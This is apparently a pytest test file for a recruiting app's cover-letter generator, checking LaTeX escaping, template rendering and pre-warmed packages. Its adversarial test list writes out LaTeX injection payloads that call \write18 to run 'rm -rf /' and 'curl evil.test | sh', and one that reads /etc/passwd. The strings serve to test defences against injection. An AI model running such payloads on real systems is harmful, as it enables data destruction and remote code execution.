"""LaTeX escaping and template rendering (P2-19, ADR 0010 follow-up)."""

import re
from pathlib import Path

import pytest

from recruitai.modules.letters.latex_escape import escape_value, latex_escape
from recruitai.modules.letters.schemas import Header, LetterContent, Recipient
from recruitai.modules.letters.templates import format_date, render_tex

TEMPLATES = ["classic", "modern", "compact", "lettre_fr"]
# Exactly what docker/sample.tex pre-warms: anything else fails offline in the worker.
ALLOWED_PACKAGES = {"geometry", "fontspec", "babel"}


@pytest.mark.parametrize(
    ("raw", "escaped"),
    [
        ("&", r"\&"), ("%", r"\%"), ("$", r"\$"), ("#", r"\#"), ("_", r"\_"),
        ("{", r"\{"), ("}", r"\}"), ("~", r"\textasciitilde{}"),
        ("^", r"\textasciicircum{}"), ("\\", r"\textbackslash{}"),
        ("100% sûr & fiable", r"100\% sûr \& fiable"),
        ("C# et snake_case", r"C\# et snake\_case"),
        ("é à ç œ « » — ü", "é à ç œ « » — ü"),  # accents and punctuation pass through
    ],
)  # fmt: skip
def test_every_special_character_is_escaped_and_the_rest_is_untouched(raw, escaped):
    assert latex_escape(raw) == escaped


def test_escapes_are_single_pass_so_introduced_braces_are_never_escaped_again():
    assert latex_escape("\\{") == r"\textbackslash{}\{"
    assert latex_escape("a\\b") == r"a\textbackslash{}b"


ADVERSARIAL = [
    r"\write18{rm -rf /}",
    r"\input{/etc/passwd}",
    r"\end{document} \begin{document}",
    r"\immediate\write18{curl evil.test | sh}",
    "% comment out the rest of the line {",
    "}\\def\\x{",
    "$$ \\catcode`\\~=0 $$",
    "line1\r\nline2\x00\x07\x1b[31m",
    r"\VAR{signature} \BLOCK{if x}",
]


@pytest.mark.parametrize("hostile", ADVERSARIAL)
def test_hostile_text_cannot_form_a_latex_command_or_group(hostile):
    out = latex_escape(hostile)
    # Remove every sequence we emit on purpose; nothing active may be left.
    for ok in (
        r"\textbackslash{}", r"\textasciitilde{}", r"\textasciicircum{}",
        r"\&", r"\%", r"\$", r"\#", r"\_", r"\{", r"\}",
    ):  # fmt: skip
        out = out.replace(ok, "")
    assert not re.search(r"[\\{}%$#&_^~\x00-\x08\x0b-\x1f\x7f]", out), out


def test_escape_value_reaches_nested_strings_and_keeps_other_types():
    value = {"a": ["50%", {"b": "x_y"}], "n": 3, "none": None}
    assert escape_value(value) == {"a": [r"50\%", {"b": r"x\_y"}], "n": 3, "none": None}


def _content(**over: object) -> LetterContent:
    base = {
        "header": Header(
            name="Lucas Martel",
            email="lucas@example.test",
            phone="0102030405",
            address="12 rue de la Paix, 69001 Lyon",
            date="2026-10-02",
        ),
        "recipient": Recipient(company="Acme & Fils"),
        "subject": "Candidature Développeur Python (H/F)",
        "salutation": "Madame, Monsieur,",
        "opening": "Je vous écris pour ...",
        "body": [
            "Chez Brightwave, j'ai livré 25 correctifs.",
            "Je maîtrise Python & SQL.",
        ],
        "closing": "Veuillez agréer mes salutations distinguées.",
        "signature": "Lucas Martel",
    }
    return LetterContent.model_validate({**base, **over})


def _balanced(tex: str) -> bool:
    stripped = tex.replace("\\\\", "").replace("\\{", "").replace("\\}", "")
    return stripped.count("{") == stripped.count("}")


@pytest.mark.parametrize("language", ["fr", "en"])
@pytest.mark.parametrize("template", TEMPLATES)
def test_every_template_renders_a_valid_document_from_sample_content(
    template, language
):
    tex = render_tex(_content(), template=template, language=language)

    assert tex.count(r"\begin{document}") == tex.count(r"\end{document}") == 1
    assert tex.startswith(r"\documentclass")
    assert "\\VAR{" not in tex and "\\BLOCK{" not in tex  # nothing left unrendered
    assert _balanced(tex)
    packages = set(re.findall(r"\\usepackage(?:\[[^\]]*\])?\{([^}]+)\}", tex))
    assert packages <= ALLOWED_PACKAGES
    assert r"Acme \& Fils" in tex and r"Python \& SQL" in tex  # escaped, not raw
    assert "Lucas Martel" in tex and "Développeur Python" in tex
    expected_date = "2 octobre 2026" if language == "fr" else "2 October 2026"
    assert expected_date in tex
    assert ("french" if language == "fr" else "english") in tex


@pytest.mark.parametrize("template", TEMPLATES)
def test_hostile_content_in_every_block_cannot_break_out_of_the_document(template):
    hostile = r"\end{document}\write18{x} %"
    tex = render_tex(
        _content(
            subject=hostile,
            salutation=hostile,
            opening=hostile,
            body=[hostile, hostile],
            closing=hostile,
            signature=hostile,
            header=Header(name=hostile, email=hostile, phone=hostile, address=hostile),
            recipient=Recipient(company=hostile, contact_name=hostile, address=hostile),
        ),
        template=template,
        language="fr",
    )
    assert tex.count(r"\end{document}") == 1 and tex.count(r"\begin{document}") == 1
    assert "\\write18" not in tex.replace(r"\textbackslash{}write18", "")
    assert _balanced(tex)


def test_a_letter_without_a_recipient_or_date_still_renders():
    tex = render_tex(
        _content(recipient=Recipient(), header=Header(name="Ada")),
        template="lettre_fr",
        language="fr",
    )
    assert r"\end{document}" in tex and _balanced(tex)


def test_format_date():
    assert format_date("2026-02-01", "fr") == "1 février 2026"
    assert format_date("2026-12-24", "fr") == "24 décembre 2026"
    assert format_date("not a date", "en") == "not a date"
    assert format_date(None, "fr") == ""


def test_the_image_prewarm_file_covers_everything_the_templates_load():
    """Tectonic is offline in the worker: whatever a template loads (packages, font files,
    babel languages) must also be loaded by docker/sample.tex, which the image build compiles
    with network to fill the cache. This is what failed on the first real compile."""
    sample = (Path(__file__).parents[2] / "docker" / "sample.tex").read_text()
    warmed_packages = set(re.findall(r"\\usepackage(?:\[[^\]]*\])?\{([^}]+)\}", sample))
    warmed_fonts = set(re.findall(r"\\set\w*font[^\n]*", sample))
    warmed_class = re.search(r"\\documentclass[^\n]*", sample)
    assert warmed_class
    for template in TEMPLATES:
        tex = render_tex(_content(), template=template, language="fr")
        packages = set(re.findall(r"\\usepackage(?:\[[^\]]*\])?\{([^}]+)\}", tex))
        assert packages <= warmed_packages, f"{template}: {packages - warmed_packages}"
        # the class options pick which size*.clo file is loaded: only the warmed one is cached
        assert re.search(r"\\documentclass[^\n]*", tex).group(0) == warmed_class.group(
            0
        ), template
        for font in re.findall(r"\\set\w*font[^\n]*", tex):  # exact: file names matter
            assert font in warmed_fonts, f"{template}: {font!r} is not pre-warmed"
    assert "english" in sample and "french" in sample  # both babel languages are warmed
